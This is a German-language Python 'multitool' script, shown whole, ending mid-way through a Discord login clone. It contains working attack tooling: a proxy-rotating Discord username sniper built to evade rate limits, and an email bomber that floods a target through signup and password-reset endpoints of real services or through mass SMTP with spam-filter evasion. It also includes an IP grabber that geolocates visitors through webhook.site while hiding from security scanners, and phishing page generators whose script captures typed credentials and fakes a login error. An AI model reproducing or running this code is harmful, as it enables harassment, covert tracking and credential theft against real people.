# ENI Multitool 
# Install: pip install requests colorama phonenumbers

import os, sys, time, json, random, string, base64, threading, socket, re
import http.server, socketserver, tempfile, subprocess
from datetime import datetime
from queue import Queue
from urllib.parse import urlparse, parse_qs

try:
    import requests
    from colorama import Fore, Style, init
    init(autoreset=True, convert=True)
except ImportError:
    print("[!] Missing: pip install requests colorama phonenumbers"); sys.exit(1)

try:
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    HAS_PHONE = True
except ImportError:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "phonenumbers"])
        import phonenumbers
        from phonenumbers import geocoder, carrier, timezone
        HAS_PHONE = True
    except: HAS_PHONE = False

try: import msvcrt; HAS_MSVCRT = True
except: HAS_MSVCRT = False

####globals
R=Fore.RED;G=Fore.GREEN;Y=Fore.YELLOW;C=Fore.CYAN;M=Fore.MAGENTA;W=Fore.WHITE
B=Style.BRIGHT;DIM=Style.DIM;RST=Style.RESET_ALL

VERSION = "6.0"
BASE = os.path.dirname(os.path.abspath(__file__))
HITS_DIR = os.path.join(BASE, "hits")
PHISH_DIR = os.path.join(BASE, "phishing_pages")
os.makedirs(HITS_DIR, exist_ok=True); os.makedirs(PHISH_DIR, exist_ok=True)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
DISCORD_API = "https://discord.com/api/v9"
SUPER_PROPS = base64.b64encode(json.dumps({
    "os":"Windows","browser":"Chrome","device":"","system_locale":"en-US",
    "browser_user_agent":UA,"browser_version":"120.0.0.0","os_version":"10",
    "referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"",
    "release_channel":"stable","client_build_number":260292,"client_event_source":None,
}).encode()).decode()
DISCORD_HEADERS = {"Content-Type":"application/json","User-Agent":UA,
    "X-Super-Properties":SUPER_PROPS,"X-Discord-Locale":"en-US",
    "Origin":"https://discord.com","Referer":"https://discord.com/"}

class BackToMenu(Exception): pass

def clear(): os.system("cls" if os.name == "nt" else "clear")
def ts(): return datetime.now().strftime("%H:%M:%S")
def log(tag, msg, color=W): print(f"{C}[{ts()}]{RST} {color}{B}[{tag}]{RST} {msg}")
def save_hit(kind, data):
    with open(os.path.join(HITS_DIR, f"{kind}.txt"), "a", encoding="utf-8") as f:
        f.write(f"{data}\n")

def ask(prompt, default=None):
    val = input(f"{C}{prompt}{RST}").strip()
    if val.lower() in ("0","esc","b","back","zurück","zurueck"): raise BackToMenu()
    return val if val else (default or "")

def pause():
    print(f"\n{Y}[ Enter = zurück ]{RST}", end="", flush=True); input()


BANNER_LINES = [
    "  ███╗   ██╗███████╗██╗   ██╗███████╗██████╗     ███████╗████████╗██████╗ ███████╗███████╗███████╗",
    "  ████╗  ██║██╔════╝██║   ██║██╔════╝██╔══██╗    ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝",
    "  ██╔██╗ ██║█████╗  ██║   ██║█████╗  ██████╔╝    ███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗",
    "  ██║╚██╗██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗    ╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║",
    "  ██║ ╚████║███████╗ ╚████╔╝ ███████╗██║  ██║    ███████║   ██║   ██║  ██║███████╗███████║███████║",
    "  ╚═╝  ╚═══╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝    ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝",
]

def print_banner():
    print()
    for line in BANNER_LINES:
        print(f"{W}{B}{line}{RST}")
    print()

def startup_animation():
    """Clean sweep-reveal with color wave — Red Tiger vibes."""
    clear()
    print()


    max_len = max(len(l) for l in BANNER_LINES)
  
    grad_colors = [DIM+W, W, W+B, W+B, W+B, W, DIM+W]

    revealed = [""] * len(BANNER_LINES)
    for col in range(max_len + 1):
        
        sys.stdout.write("\033[H\033[J")  
        print()
        for i, line in enumerate(BANNER_LINES):
            if col < len(line):
                ch = line[col]
                revealed[i] += ch
            
            out = ""
            for j, ch in enumerate(revealed[i]):
                
                dist = len(revealed[i]) - 1 - j
                if dist < len(grad_colors) and ch != " ":
                    out += f"{grad_colors[dist]}{ch}{RST}"
                elif ch == " ":
                    out += " "
                else:
                    out += f"{W}{B}{ch}{RST}"
            print(out)
        time.sleep(0.008)

    
    time.sleep(0.15)
    for brightness in [DIM+W, W, W+B, W+B]:
        sys.stdout.write("\033[H\033[J")
        print()
        for line in BANNER_LINES:
            print(f"{brightness}{line}{RST}")
        time.sleep(0.08)
    print()
    time.sleep(0.2)
    return
  
    subline = f""
    print(f"{DIM}{C}", end="", flush=True)
    for ch in subline:
        print(ch, end="", flush=True)
        time.sleep(0.004)
    print(f"{RST}\n")
    time.sleep(0.3)


# DC SNIPER

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
]

def fetch_proxies():
    proxies = set()
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip().replace("http://","").replace("https://","")
                    if ":" in line and not line.startswith("#"): proxies.add(line)
        except: pass
    return list(proxies)

def discord_username_sniper():
    clear(); print_banner()
    print(f"{M}{B}» Discord Username Sniper — TURBO PARALLEL{RST}")
    print(f"{W}   Max speed mit vielen threads + proxy rotation.{RST}\n")

    length = int(ask("Länge in buchstaben (2-32) [4]: ", "4"))
    if length < 2 or length > 32: length = 4

    count_str = ask("Wie viele namen suchen? (0 = unendlich) [1000]: ", "1000")
    total = int(count_str) if count_str.isdigit() else 1000

    threads = int(ask("Threads (mehr = schneller, empfohlen 50-200) [100]: ", "100"))

    print(f"\n{Y}[*] Lade proxies (~5-10s)...{RST}")
    proxy_list = fetch_proxies()
    if not proxy_list:
        log("ERR", "keine proxies erreichbar", R); pause(); return
    print(f"{G}[+] {len(proxy_list)} proxies bereit{RST}")
    print(f"{G}[+] {threads} threads starten\n{RST}")

    proxy_queue = Queue()
    for p in proxy_list: proxy_queue.put(p)

    stats = {"checked": 0, "hits": 0, "taken": 0, "dead": 0}
    lock = threading.Lock()
    stop = threading.Event()
    charset = string.ascii_lowercase + string.digits
    unlimited = (total == 0)

    def worker():
        while not stop.is_set():
            with lock:
                if not unlimited and stats["checked"] >= total: return
            try:
                proxy = proxy_queue.get(timeout=3)
            except:
                # nachladen im hintergrund
                new = fetch_proxies()
                for p in new: proxy_queue.put(p)
                continue

            u = "".join(random.choices(charset, k=length))
            try:
                r = requests.post(
                    f"{DISCORD_API}/unique-username/username-attempt-unauthed",
                    json={"username": u}, headers=DISCORD_HEADERS,
                    proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"},
                    timeout=5,
                )
                if r.status_code == 200:
                    taken = r.json().get("taken", True)
                    with lock:
                        stats["checked"] += 1
                        if taken:
                            stats["taken"] += 1
                            print(f"{R}[TAKEN]{RST} {u}")
                        else:
                            stats["hits"] += 1
                            print(f"{G}{B}[FREI!] {u} ← claim now! (#{stats['hits']}){RST}")
                            save_hit("discord_usernames", u)
                    proxy_queue.put(proxy)  # proxy 
                elif r.status_code == 429:
                    # silent switch
                    with lock: stats["dead"] += 1
                    
                    time.sleep(2)
                    proxy_queue.put(proxy)
                else:
                    with lock: stats["dead"] += 1
            except Exception:
                with lock: stats["dead"] += 1

    threads_list = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in threads_list: t.start()

    try:
        for t in threads_list: t.join()
        stop.set(); time.sleep(0.3)
    except KeyboardInterrupt:
        stop.set(); time.sleep(0.5)

    print(f"\n\n{G}{B}=== FERTIG ==={RST}")
    print(f"{C}Gecheckt: {RST}{stats['checked']}")
    print(f"{C}Taken:    {RST}{R}{stats['taken']}{RST}")
    print(f"{C}Frei:     {RST}{G}{B}{stats['hits']}{RST}  → gespeichert in hits/discord_usernames.txt")
    pause()


#### EMAIL BOMBER ####

SUBSTACKS = ["astralcodexten","noahpinion","garymarcus","letter","pluralistic",
    "lennysnewsletter","readtangle","hive","byejoana","matt","popular","seth",
    "bariweiss","mattyglesias","greenwald","richardhanania","commonsense",
    "puckdaily","notboring","stratechery","platformer","casey","yascha",
    "andrewsullivan","freddiedeboer","persuasion","unherd","danluu",
    "acesounderglass","diminishingreturns","erickim","notesonprogress",
    "commonreader","publiceditor","sinocism","chinatalk","importai",
    "thegeneralist","napkinmath","ourfuture","cremieux","themargins","money"]


def _b_ghost(email, s, host):
    """Ghost blogs magic-link — sendet 'sign in' mail zu jeder addresse"""
    return s.post(f"https://{host}/members/api/send-magic-link/",
        json={"email":email,"emailType":"signup","name":"","autoRedirect":True}, timeout=10)

def _b_substack(email, s, pub):
    return s.post(f"https://{pub}.substack.com/api/v1/free",
        data={"email":email,"first_url":f"https://{pub}.substack.com/","source":"cover_page"}, timeout=10)

def _b_duolingo(email, s):
    return s.post("https://www.duolingo.com/2017-06-30/users/password/reset",
        json={"email":email}, timeout=10)

def _b_shopify_pw(email, s):
    return s.post("https://accounts.shopify.com/lookup", data={"email":email}, timeout=10)

def _b_evernote(email, s):
    return s.post("https://www.evernote.com/ForgotPassword.action",
        data={"username":email}, timeout=10)

def _b_grammarly(email, s):
    return s.post("https://auth.grammarly.com/v3/api/unified-login/oauth/password_reset/init",
        json={"email":email}, timeout=10,
        headers={"Content-Type":"application/json","x-container-service":"unified-login-service"})

GHOST_BLOGS = [
    "every.to","www.honestbroker.substack.com","www.readtangle.com","www.thediff.co",
    "www.404media.co","www.readtrung.com","garymarcus.substack.com","stratechery.com",
    "www.notboring.co","world.hey.com","gomakethings.com","css-tricks.com",
    "blog.pragmaticengineer.com","www.oneusefulthing.org","newsletter.pragmaticengineer.com",
    "blog.bytebytego.com","www.thediff.co","www.readmargins.com","www.trueanon.com",
    "www.honestpod.com","refactoring.fm","kentcdodds.com","daily.dev",
]

def _b_ghost_reliable(email, s, host):
    """Ghost sites — sehr reliable, senden magic-link mails an fast alle addresses."""
    try:
        return s.post(f"https://{host}/members/api/send-magic-link/",
            json={"email":email,"emailType":"signup","name":email.split("@")[0],"autoRedirect":True},
            timeout=10, headers={"Content-Type":"application/json","Origin":f"https://{host}"})
    except: pass

SUBSTACK_PUBS = SUBSTACKS  

BOMBERS_ALL = []

for g in GHOST_BLOGS: BOMBERS_ALL.append(("ghost", g, _b_ghost_reliable))

for p in SUBSTACK_PUBS: BOMBERS_ALL.append(("substack", p, _b_substack))

BOMBERS_ALL.append(("duolingo", None, _b_duolingo))
BOMBERS_ALL.append(("shopify", None, _b_shopify_pw))
BOMBERS_ALL.append(("evernote", None, _b_evernote))
BOMBERS_ALL.append(("grammarly", None, _b_grammarly))

TEMP_MAIL_DOMAINS = {
    "10minutemail","10minutemail.one","imxwe.com","dbwot.com","tempmail.com",
    "tempmail.org","temp-mail.org","guerrillamail.com","sharklasers.com",
    "yopmail.com","maildrop.cc","mailinator.com","trashmail.com","fakeinbox.com",
    "throwawaymail.com","mohmal.com","emailondeck.com","getnada.com","tempail.com",
    "dispostable.com","mytemp.email","tempinbox.com","mailnesia.com","spam4.me",
    "mailcatch.com","tempmail.io","tempmailo.com","emltmp.com","tempmailaddress.com",
}
def _is_temp_mail(email):
    dom = email.split("@")[-1].lower()
    if dom in TEMP_MAIL_DOMAINS: return True
    # temp mail 
    for kw in ["temp","trash","throw","fake","spam","dispos","10min","minute","hour"]:
        if kw in dom: return True
    return False

#  host, port, ssl/starttls
SMTP_PROVIDERS = {
    "gmail.com":    ("smtp.gmail.com", 465, "ssl"),
    "googlemail.com":("smtp.gmail.com", 465, "ssl"),
    "outlook.com":  ("smtp-mail.outlook.com", 587, "starttls"),
    "hotmail.com":  ("smtp-mail.outlook.com", 587, "starttls"),
    "live.com":     ("smtp-mail.outlook.com", 587, "starttls"),
    "yahoo.com":    ("smtp.mail.yahoo.com", 465, "ssl"),
    "yahoo.de":     ("smtp.mail.yahoo.com", 465, "ssl"),
    "protonmail.com":("smtp.protonmail.ch", 587, "starttls"),
    "proton.me":    ("smtp.protonmail.ch", 587, "starttls"),
    "gmx.de":       ("mail.gmx.net", 587, "starttls"),
    "gmx.net":      ("mail.gmx.net", 587, "starttls"),
    "gmx.com":      ("mail.gmx.com", 587, "starttls"),
    "web.de":       ("smtp.web.de", 587, "starttls"),
    "t-online.de":  ("securesmtp.t-online.de", 465, "ssl"),
    "mail.com":     ("smtp.mail.com", 587, "starttls"),
    "zoho.com":     ("smtp.zoho.com", 465, "ssl"),
    "aol.com":      ("smtp.aol.com", 465, "ssl"),
    "mail.ru":      ("smtp.mail.ru", 465, "ssl"),
    "yandex.com":   ("smtp.yandex.com", 465, "ssl"),
    "yandex.ru":    ("smtp.yandex.ru", 465, "ssl"),
    "icloud.com":   ("smtp.mail.me.com", 587, "starttls"),
    "me.com":       ("smtp.mail.me.com", 587, "starttls"),
}

SUBJ_POOL = [
    "Frage zu deinem Angebot","Kurze Rückmeldung","Update","Wichtige Info",
    "Anfrage","Deine Bestellung","Bestätigung","Neuigkeiten","Zur Info",
    "Kurzer Hinweis","Willkommen","Danke!","Erinnerung","Kleiner Gruß",
    "Deine Anmeldung","Wichtig","Antwort erforderlich","Kurz vorab","Info an dich",
    "Deine Rechnung","Zur Bestätigung","Feedback","Frage an dich","Neuer Termin",
]
BODY_POOL = [
    "Hi,\n\nich melde mich kurz wegen der letzten Woche. Kannst du mir Bescheid geben, wann es dir passt?\n\nVG",
    "Hey,\n\nkurze Nachricht - danke für die schnelle Antwort neulich!\n\nBis bald.",
    "Guten Tag,\n\nanbei die versprochenen Infos. Bei Fragen einfach melden.\n\nBeste Grüße",
    "Hallo,\n\nfalls du noch nichts vom Team gehört hast, ich hake mal kurz nach.\n\nSchöne Woche!",
    "Moin,\n\nkurzer Update-Ping. Der Prozess läuft weiter wie besprochen.\n\nGruß",
    "Hi zusammen,\n\ndanke nochmal fürs Meeting gestern. War echt hilfreich!\n\nCiao",
    "Servus,\n\nich wollte nur kurz sagen, dass alles auf dem Weg ist. Meld mich bei Neuigkeiten.\n\nVG",
    "Hey du,\n\nlange nichts mehr gehört. Wie geht's dir? Melde dich mal!\n\nLG",
    "Guten Morgen,\n\nnur zur Info: das Meeting wurde auf morgen verschoben. Genauere Details folgen.\n\nDanke!",
    "Hallo,\n\nich hoffe, es geht gut. Kurze Frage - hast du Zeit für einen kurzen Call?\n\nBeste Grüße",
]

def _smtp_bomber(target, sender, app_password, count, threads, subj_pool=None, body_pool=None, anti_spam=True):
    """Auto-detect provider + direct SMTP send."""
    import smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart

    # pools 
    subjects = subj_pool if (subj_pool and len(subj_pool) > 1) else (SUBJ_POOL if anti_spam else (subj_pool or ["ENI"]))
    bodies = body_pool if (body_pool and len(body_pool) > 1) else (BODY_POOL if anti_spam else (body_pool or ["hey"]))

    domain = sender.split("@")[-1].lower()
    if domain not in SMTP_PROVIDERS:
        print(f"{R}[!] Provider {domain} nicht bekannt — bitte melden, füge ich hinzu{RST}")
        return
    smtp_host, smtp_port, smtp_mode = SMTP_PROVIDERS[domain]
    print(f"{G}[+] Provider erkannt: {W}{domain}{RST} → {C}{smtp_host}:{smtp_port} ({smtp_mode}){RST}")

    sent = [0]; fail = [0]; idx = [0]
    lock = threading.Lock(); stop = threading.Event()

    def make_conn():
        if smtp_mode == "ssl":
            s = smtplib.SMTP_SSL(smtp_host, smtp_port, timeout=15)
        else:
            s = smtplib.SMTP(smtp_host, smtp_port, timeout=15)
            s.starttls()
        s.login(sender, app_password)
        return s

    def worker():
        try: server = make_conn()
        except Exception as e:
            err = str(e)
            hint = ""
            if "535" in err or "BadCredentials" in err or "authentication" in err.lower():
                hint = f"\n{Y}   → App password falsch! Für Gmail brauchst du 16-char password{RST}"
                hint += f"\n{Y}     von myaccount.google.com/apppasswords (NICHT dein normales pw){RST}"
                if "gmail" in domain:
                    hint += f"\n{Y}     Format: 'abcd efgh ijkl mnop' — keine sonderzeichen{RST}"
            print(f"{R}[!] SMTP login fehler: {err[:200]}{RST}{hint}")
            return
        while not stop.is_set():
            with lock:
                if idx[0] >= count: break
                n = idx[0] + 1; idx[0] += 1
            try:
                subj = random.choice(subjects)
                body = random.choice(bodies)
                msg = MIMEMultipart()
                msg["From"] = sender
                msg["To"] = target
                msg["Subject"] = subj if not anti_spam else subj
                msg.attach(MIMEText(body, "plain", "utf-8"))
                server.sendmail(sender, target, msg.as_string())
                with lock:
                    sent[0] += 1
                    print(f"{G}[✓] {sent[0]}/{count}{RST}  {DIM}subj: {subj[:40]}{RST}")
                if anti_spam:
                    time.sleep(random.uniform(3, 8))  # random delay
            except Exception as e:
                with lock:
                    fail[0] += 1
                    print(f"{R}[✗] fail #{fail[0]} — {str(e)[:80]}{RST}")
                if anti_spam:
                    time.sleep(random.uniform(5, 12))
        try: server.quit()
        except: pass

    ths = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in ths: t.start()
    try:
        for t in ths: t.join()
    except KeyboardInterrupt: stop.set()
    print(f"\n\n{G}{B}=== DONE ==={RST}")
    print(f"{G}{sent[0]} mails DELIVERED{RST}  {R}{fail[0]} failed{RST}")

def email_bomber():
    clear(); print_banner()
    print(f"{M}{B}» Email Bomber v3{RST}\n")
    print(f"  {C}1{RST}) SMTP direct (gmail app password)  {G}★ RECOMMENDED{RST}")
    print(f"  {C}2{RST}) Multi-service (substack/password-reset — {Y}unreliable{RST})")
    mode = ask("\nWahl: ")

    target = ask("Target Email: ")
    if "@" not in target: log("ERR","invalid",R); pause(); return

    if mode == "1":
        print(f"\n{Y}SMTP Setup:{RST}")
        print(f"{DIM}  Gmail: APP PASSWORD von myaccount.google.com/apppasswords{RST}")
        print(f"{DIM}  GMX/Web.de/andere: NORMALES passwort (aber POP3/IMAP aktivieren){RST}\n")
        sender = ask("Deine E-Mail Adresse: ")
        pw = ask("Passwort: ").replace(" ","")
        count = int(ask("Anzahl mails [50]: ","50"))
        threads = int(ask("Threads (1-3 empfohlen wg spam-filter) [2]: ","2"))
        anti_spam = ask("Anti-Spam mode? (random subjects/bodies/delays) (Y/n): ","y").lower() != "n"

        if anti_spam:
            subj_pool = None; body_pool = None
            print(f"{G}[+] Anti-Spam mode aktiv — random subjects+bodies, delays{RST}")
        else:
            subj = ask("Subject [ENI]: ","ENI")
            body = ask("Body text [hey]: ","hey")
            subj_pool = [subj]; body_pool = [body]

        print(f"\n{G}[+] Sende {count} mails an {target}...{RST}\n")
        _smtp_bomber(target, sender, pw, count, threads, subj_pool, body_pool, anti_spam)
        pause(); return

    # temp mail 
    if _is_temp_mail(target):
        print(f"\n{R}{B}╔══════════════════════════════════════════════════╗{RST}")
        print(f"{R}{B}║  ⚠  TEMP-MAIL ERKANNT!                          ║{RST}")
        print(f"{R}{B}╚══════════════════════════════════════════════════╝{RST}")
        print(f"{Y}   {target} sieht aus wie ne 10min/temp mail.{RST}")
        print(f"{Y}   FAST ALLE services (substack, mailchimp, etc.){RST}")
        print(f"{Y}   blocken diese domains — request geht durch (200),{RST}")
        print(f"{Y}   aber es kommt nie ne mail an.{RST}")
        print(f"{W}   → Zum testen: nutze deine echte gmail/outlook adresse.{RST}")
        print(f"{W}   → Der bomber ist gedacht für echte target-adressen.{RST}\n")
        if ask(f"{R}Trotzdem weitermachen? (y/N): {RST}","n").lower() != "y":
            pause(); return

    rounds = int(ask(f"Runden (1 runde = ~{len(BOMBERS_ALL)} mails) [3]: ","3"))
    threads = int(ask("Threads [15]: ","15"))
    delay = float(ask("Delay in s [0.3]: ","0.3"))
    verbose = ask("Verbose mode? (Y/n): ","y").lower() != "n"

    queue = []
    for _ in range(rounds):
        pool = BOMBERS_ALL[:]; random.shuffle(pool); queue.extend(pool)
    total = len(queue); ok = [0]; bad = [0]; idx = [0]
    lock = threading.Lock(); stop = threading.Event()

    def worker():
        s = requests.Session(); s.headers.update({"User-Agent":UA})
        while not stop.is_set():
            with lock:
                if idx[0] >= len(queue): return
                job = queue[idx[0]]; idx[0] += 1
            kind, host, fn = job
            try:
                if host: r = fn(target, s, host)
                else: r = fn(target, s)
                with lock:
                    if r.status_code in (200,201,202,204,302):
                        ok[0] += 1
                        if verbose:
                            print(f"{G}[✓]{RST} {kind:<10} {host or '-':<28} → {G}{r.status_code}{RST}")
                        else:
                            print(f"\r{G}[✓] {ok[0]}/{total}{RST} {R}fail:{bad[0]}{RST}          ", end="")
                    else:
                        bad[0] += 1
                        if verbose:
                            print(f"{R}[✗]{RST} {kind:<10} {host or '-':<28} → {R}{r.status_code}{RST}")
            except Exception as e:
                with lock:
                    bad[0] += 1
                    if verbose: print(f"{Y}[!]{RST} {kind:<10} → {Y}{type(e).__name__}{RST}")
            time.sleep(delay)

    print(f"\n{G}[+] Flooding {target} — {total} attempts{RST}\n")
    ths = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in ths: t.start()
    try:
        for t in ths: t.join()
    except KeyboardInterrupt: stop.set()

    print(f"\n\n{G}{B}=== FERTIG ==={RST}")
    print(f"{C}Erfolgreiche requests: {G}{ok[0]}/{total}{RST}")
    print(f"{C}Failed:                {R}{bad[0]}{RST}")
    print(f"\n{Y}[!] Nicht alle erfolgreichen requests senden garantiert ne mail —{RST}")
    print(f"{Y}    manche services checken erst ob account existiert.{RST}")
    print(f"{Y}    Check den posteingang, sollten aber substack confirmations{RST}")
    print(f"{Y}    + password-reset mails ankommen.{RST}")
    pause()


# IP GRABBER (via webhook.site)

def ip_grabber():
    clear(); print_banner()
    print(f"{M}{B}» IP Grabber{RST}\n")
    try:
        r = requests.post("https://webhook.site/token",
            json={"default_status":302,"cors":True,"expiry":True}, timeout=15)
        token = r.json()["uuid"]
    except Exception as e: log("ERR",str(e),R); pause(); return
    grab_url = f"https://webhook.site/{token}"
    redirect = ask("Redirect ziel [google.com]: ","https://www.google.com")
    try:
        requests.put(f"https://webhook.site/token/{token}",
            json={"default_status":302,"response_headers":{"Location":redirect}}, timeout=15)
    except: pass
    print(f"\n{G}{B}  Grab-link: {Y}{grab_url}{RST}")
    print(f"{W}  → redirect zu {redirect}{RST}")
    print(f"{DIM}  Bot-filter aktiv (Discord/Google/VirusTotal preview-bots werden versteckt){RST}")
    print(f"{C}[waiting — STRG+C = stop]{RST}\n")

    BOT_UAS = ["bot","crawler","spider","curl","wget","python","go-http","java/",
               "postman","httpclient","axios","node-fetch","facebookexternalhit",
               "slackbot","telegrambot","twitterbot","linkedinbot","discordbot",
               "whatsapp","preview","scanner","monitor","preview","embed",
               "virustotal","googlebot","bingbot","yandex","baidu","duckduck",
               "appengine","aws-","cloudfront","headless","phantom"]
    BOT_ISPS = ["amazon","google llc","google cloud","microsoft","digital ocean",
                "digitalocean","hetzner","ovh","linode","cloudflare","fastly",
                "akamai","limelight","incapsula","alibaba","tencent","virustotal",
                "hostroyale","trafficforce","chinanet","choopa","vultr","leaseweb"]

    def is_bot(ua, isp=""):
        u = (ua or "").lower(); i = (isp or "").lower()
        return any(b in u for b in BOT_UAS) or any(b in i for b in BOT_ISPS)

    seen = set(); real = 0; bots = 0
    try:
        while True:
            try:
                res = requests.get(f"https://webhook.site/token/{token}/requests?sorting=newest", timeout=10)
                for req in reversed(res.json().get("data", [])):
                    rid = req.get("uuid")
                    if rid in seen: continue
                    seen.add(rid)
                    ip = req.get("ip","?"); ua = req.get("user_agent","?")
                    isp = ""
                    try:
                        geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
                        isp = geo.get("isp","")
                    except: geo = {}
                    if is_bot(ua, isp):
                        bots += 1
                        print(f"{DIM}  [bot] {ip} · {isp[:30]} · {ua[:40]}{RST}")
                        continue
                    real += 1
                    print(f"\n{G}{B}╔══ REAL HIT #{real} ══════════════════════╗{RST}")
                    print(f"  {C}IP:{RST}  {G}{B}{ip}{RST}")
                    print(f"  {C}GEO:{RST} {W}{geo.get('country','?')} · {geo.get('city','?')} · {isp}{RST}")
                    print(f"  {C}UA:{RST}  {DIM}{ua[:80]}{RST}")
                    print(f"{G}{B}╚═════════════════════════════════════════╝{RST}")
                    save_hit("grabbed_ips", f"{ip} | {geo.get('country')} | {isp} | {ua}")
            except: pass
            time.sleep(3)
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Ergebnis: {G}{real} echte hits{Y}, {DIM}{bots} bots gefiltert{RST}")
        pause()


#  PHISHING — self-hosted 

PHISH_STATE = {"site":"unknown","count":0}

def _phish_page(title, brand_color, text_color, bg_style, logo_html, header, sub, fields, footer_html, redirect_url, site):
    fields_html = "\n".join(
        f'<div class="field"><label>{lbl}</label><input name="{n}" type="{t}" required autocomplete="off"></div>'
        for n, t, lbl in fields
    )
    return f"""<!doctype html><html lang="de"><head><meta charset="utf-8"><title>{title}</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{{box-sizing:border-box;margin:0;padding:0;font-family:'Inter','Helvetica Neue',Arial,sans-serif;-webkit-font-smoothing:antialiased}}
html,body{{min-height:100vh}}
body{{{bg_style};color:{text_color};display:flex;align-items:center;justify-content:center;padding:20px}}
.card{{background:rgba(0,0,0,.22);backdrop-filter:blur(8px);padding:36px 32px;border-radius:10px;width:100%;max-width:440px;box-shadow:0 12px 40px rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.08)}}
.logo{{text-align:center;margin-bottom:22px}}
h1{{text-align:center;font-size:22px;font-weight:600;margin-bottom:6px;line-height:1.3}}
.sub{{text-align:center;font-size:14px;opacity:.7;margin-bottom:24px}}
.field{{margin-bottom:14px}}
label{{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.04em;opacity:.75;margin-bottom:6px}}
input{{width:100%;padding:12px 14px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.12);border-radius:6px;color:{text_color};font-size:15px;height:42px;outline:none;transition:.15s;font-family:inherit}}
input:focus{{border-color:{brand_color};background:rgba(255,255,255,.08)}}
input.err{{border-color:#ef4444;animation:shake .3s}}
@keyframes shake{{0%,100%{{transform:translateX(0)}}25%{{transform:translateX(-6px)}}75%{{transform:translateX(6px)}}}}
button{{width:100%;padding:12px;background:{brand_color};color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;height:44px;cursor:pointer;margin-top:12px;transition:.15s;font-family:inherit}}
button:hover{{filter:brightness(1.1)}}
button:disabled{{opacity:.6;cursor:not-allowed}}
.err-msg{{background:rgba(239,68,68,.15);border:1px solid rgba(239,68,68,.4);color:#fca5a5;padding:10px 12px;border-radius:6px;font-size:13px;margin-top:12px;display:none}}
.err-msg.show{{display:block}}
.footer{{text-align:center;font-size:13px;margin-top:20px;opacity:.7}}
.footer a{{color:{brand_color};text-decoration:none;font-weight:500}}
.spinner{{width:22px;height:22px;border:3px solid #fff;border-top-color:transparent;border-radius:50%;margin:auto;animation:spin .8s linear infinite}}
@keyframes spin{{to{{transform:rotate(360deg)}}}}
</style></head><body>
<div class="card">
<div class="logo">{logo_html}</div>
<h1>{header}</h1>
<div class="sub">{sub}</div>
<form id="f" novalidate>
{fields_html}
<div class="err-msg" id="err">Ungültige anmeldeinformationen. Bitte erneut versuchen.</div>
<button type="submit" id="btn">Anmelden</button>
</form>
{footer_html}
</div>
<script>
let n=0;const f=document.getElementById('f'),b=document.getElementById('btn'),e=document.getElementById('err');
f.addEventListener('submit',async ev=>{{ev.preventDefault();b.disabled=true;const old=b.innerHTML;b.innerHTML='<div class="spinner"></div>';
const d={{}};new FormData(ev.target).forEach((v,k)=>d[k]=v);d.ua=navigator.userAgent;d.site='{site}';d.attempt=++n;
// SAME-ORIGIN endpoint — cant be blocked by CORS/CSP
try{{await fetch('/submit',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(d),keepalive:true}})}}catch(x){{}}
try{{if(navigator.sendBeacon){{navigator.sendBeacon('/submit',JSON.stringify(d))}}}}catch(x){{}}
await new Promise(r=>setTimeout(r,1400));
b.disabled=false;b.innerHTML=old;e.classList.add('show');
document.querySelectorAll('input').forEach(i=>i.classList.add('err'));
setTimeout(()=>document.querySelectorAll('input').forEach(i=>i.classList.remove('err')),400);
if(n>=2){{setTimeout(()=>location.href='{redirect_url}',900)}}}});
</script></body></html>"""

def _tpl_discord():
    # Custom 1:1 Discord clone with QR code panel like real Discord
    return """<!doctype html><html lang="de"><head><meta charset="utf-8">
<title>Discord | Your Place to Talk and Hang Out</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="icon" href="https://discord.com/assets/07dca80a102d4149e9736d4b162cff6f.ico">
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;font-family:'gg sans','Noto Sans','Helvetica Neue',Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
body{background:#5865F2;background-image:radial-gradient(ellipse at top,#5865F2 0%,#404EED 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px;position:relative;overflow:hidden}
